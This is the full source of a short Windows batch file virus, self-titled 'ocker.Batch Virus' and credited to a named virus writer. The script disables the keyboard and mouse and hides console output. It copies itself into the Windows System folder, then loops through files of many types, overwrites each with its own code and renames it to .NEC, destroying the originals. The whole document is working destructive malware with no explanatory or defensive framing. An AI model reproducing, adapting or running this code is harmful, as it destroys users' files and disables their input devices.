@Echo off
ECHO *******************
ECHO *ocker.Batch Virus*
ECHO *******************
ECHO Coded by Necronomikon[ZeroGravity]
ctty nul
rundll32.exe Keyboard, Disable
rundll32.exe mouse, Disable
Copy ocker.bat C:\Windows\System\ocker.bat
IF NOT EXIST C:\Windows\System\ocker.bat GOTO END
C:
cd %windir%
cd System
: Start
for %%f in (*.htm *.pas *.bas *.nfo *.sys *.com *.c *.zip *.ini *.gif *.exe *.obj *.wav *.dat *.dll *.txt *.doc *.bmp *.jpg *.cls *.frm ) do set A=%%f
if %A%==Command.com set A=
if %A%==System.ini set A=
if %A%==MsDos.sys set A=
Copy ocker.bat %A%
ren %A% *.NEC
set A=
GoTo Start
: End
ctty con